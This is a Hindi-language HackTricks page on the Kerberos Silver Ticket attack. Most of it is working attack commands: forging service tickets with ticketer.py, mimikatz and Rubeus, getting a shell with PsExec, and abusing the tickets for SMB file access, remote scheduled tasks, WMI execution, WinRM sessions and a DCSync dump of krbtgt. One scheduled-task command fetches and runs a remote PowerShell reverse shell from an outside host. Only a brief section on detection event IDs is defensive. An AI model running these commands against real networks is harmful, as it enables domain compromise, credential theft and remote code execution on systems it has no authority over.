# सिल्वर टिकट

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ हैकट्रिक्स क्लाउड ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 ट्विटर 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ ट्विच 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 यूट्यूब 🎥</strong></a></summary>

* क्या आप **साइबरसिक्योरिटी कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी का विज्ञापन हैकट्रिक्स में दिखाई दे**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुँच चाहते हैं या हैकट्रिक्स को PDF में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & हैकट्रिक्स स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड ग्रुप**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**टेलीग्राम ग्रुप**](https://t.me/peass) या **मुझे ट्विटर पर** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** फॉलो करें**.
* **हैकिंग ट्रिक्स शेयर करें, हैकट्रिक्स रेपो में PRs सबमिट करके** [**हैकट्रिक्स रेपो**](https://github.com/carlospolop/hacktricks) **और** [**हैकट्रिक्स-क्लाउड रेपो**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

यदि आप **हैकिंग करियर** में रुचि रखते हैं और अभेद्य को हैक करना चाहते हैं - **हम भर्ती कर रहे हैं!** (_धाराप्रवाह पोलिश लिखित और बोली जरूरी है_).

{% embed url="https://www.stmcyber.com/careers" %}

## सिल्वर टिकट

सिल्वर टिकट हमला **एक वैध TGS बनाने पर आधारित है जब सेवा का NTLM हैश मालिकाना होता है** (जैसे कि **PC अकाउंट हैश**). इस प्रकार, यह संभव है कि **किसी भी उपयोगकर्ता के रूप में** एक कस्टम TGS बनाकर **उस सेवा तक पहुँच प्राप्त की जा सके**.

इस मामले में, NTLM **कंप्यूटर अकाउंट का हैश** (जो AD में एक प्रकार का उपयोगकर्ता अकाउंट है) **मालिकाना है**. इसलिए, यह संभव है कि **एक टिकट बनाई जाए** जिससे **उस मशीन में प्रवेश किया जा सके** SMB सेवा के माध्यम से **एडमिनिस्ट्रेटर** विशेषाधिकारों के साथ. कंप्यूटर अकाउंट्स अपने पासवर्ड हर 30 दिनों में डिफ़ॉल्ट रूप से रीसेट करते हैं.

यह भी ध्यान में रखा जाना चाहिए कि यह संभव और **पसंदीदा** (opsec) है कि **AES Kerberos कुंजियों (AES128 और AES256) का उपयोग करके टिकट बनाए जाएं**. AES कुंजी कैसे जनरेट करें, इसके लिए पढ़ें: [MS-KILE का अनुभाग 4.4](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/936a4878-9462-4753-aac8-087cd3ca4625) या [Get-KerberosAESKey.ps1](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372).

{% code title="Linux" %}
```bash
python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
```
```markdown
Windows में, **Mimikatz** का उपयोग **ticket** बनाने के लिए किया जा सकता है। इसके बाद, **Rubeus** के साथ ticket को **inject** किया जाता है, और अंत में **PsExec** की मदद से एक दूरस्थ shell प्राप्त की जा सकती है।

{% code title="Windows" %}
```
```bash
#Create the ticket
mimikatz.exe "kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park"
#Inject in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt ticket.kirbi"
.\Rubeus.exe ptt /ticket:ticket.kirbi
#Obtain a shell
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd

#Example using aes key
kerberos::golden /user:Administrator /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /target:labwws02.jurassic.park /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi
```
{% endcode %}

**CIFS** सेवा वह है जो आपको **पीड़ित की फाइल सिस्टम तक पहुँचने** की अनुमति देती है। आप अन्य सेवाएँ यहाँ पा सकते हैं: [**https://adsecurity.org/?page\_id=183**](https://adsecurity.org/?page\_id=183)**।** उदाहरण के लिए, आप **HOST सेवा** का उपयोग करके किसी कंप्यूटर में _**schtask**_ बना सकते हैं। फिर आप यह जांच सकते हैं कि यह काम कर रहा है या नहीं, पीड़ित के कार्यों की सूची बनाकर: `schtasks /S <hostname>` या आप **HOST और** **RPCSS सेवा** का उपयोग करके किसी कंप्यूटर में **WMI** क्वेरीज़ को निष्पादित कर सकते हैं, इसे परीक्षण करें: `Get-WmiObject -Class win32_operatingsystem -ComputerName <hostname>`

### उपाय

Silver ticket की घटनाओं की ID (golden ticket से अधिक गुप्त):

* 4624: खाता लॉगऑन
* 4634: खाता लॉगऑफ
* 4672: व्यवस्थापक लॉगऑन

[**Silver Tickets के बारे में अधिक जानकारी ired.team में**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)

## उपलब्ध सेवाएँ

| सेवा प्रकार                                | सेवा Silver Tickets                                                       |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>ओएस के आधार पर भी:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>कुछ मौकों पर आप सिर्फ पूछ सकते हैं: WINRM</p> |
| निर्धारित कार्य                            | HOST                                                                       |
| Windows File Share, साथ ही psexec          | CIFS                                                                       |
| LDAP ऑपरेशन, DCSync सहित                   | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

**Rubeus** का उपयोग करके आप इन सभी टिकटों के लिए पूछ सकते हैं पैरामीटर के साथ:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

## सेवा टिकटों का दुरुपयोग

निम्नलिखित उदाहरणों में मान लेते हैं कि टिकट प्रशासक खाते का अनुकरण करके प्राप्त की गई है।

### CIFS

इस टिकट के साथ आप **SMB** के माध्यम से `C$` और `ADMIN$` फोल्डर तक पहुँच सकते हैं (यदि वे उजागर हैं) और रिमोट फाइलसिस्टम के एक हिस्से में फाइलों की प्रतिलिपि बना सकते हैं बस ऐसा कुछ करके:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
### HOST

इस अनुमति के साथ आप दूरस्थ कंप्यूटरों में निर्धारित कार्य उत्पन्न कर सकते हैं और मनमाने आदेश निष्पादित कर सकते हैं:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

इन टिकटों के साथ आप **पीड़ित सिस्टम में WMI निष्पादित कर सकते हैं**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
निम्नलिखित पृष्ठ में **wmiexec के बारे में अधिक जानकारी** पाएं:

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

winrm के माध्यम से एक कंप्यूटर तक **पहुंच** सकते हैं और यहां तक कि PowerShell भी प्राप्त कर सकते हैं:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
दूरस्थ होस्ट से जुड़ने के **और तरीके जानने के लिए निम्नलिखित पृष्ठ देखें**:

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
ध्यान दें कि दूरस्थ कंप्यूटर पर पहुँचने के लिए **winrm सक्रिय और सुन रहा होना चाहिए**।
{% endhint %}

### LDAP

इस विशेषाधिकार के साथ आप **DCSync** का उपयोग करके DC डेटाबेस को डंप कर सकते हैं:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**DCSync के बारे में और जानें** निम्नलिखित पृष्ठ पर:

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

यदि आप **hacking career** में रुचि रखते हैं और अहैकेबल को हैक करना चाहते हैं - **हम भर्ती कर रहे हैं!** (_धाराप्रवाह पोलिश लिखित और बोली जाने वाली आवश्यक_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **cybersecurity company** में काम करते हैं? क्या आप चाहते हैं कि आपकी **company का विज्ञापन HackTricks में दिखाई दे**? या क्या आप PEASS के **नवीनतम संस्करण तक पहुँच चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) देखें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा संग्रह विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) का
* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर मुझे **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **hacktricks repo** में PRs सबमिट करके अपने hacking tricks साझा करें और [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
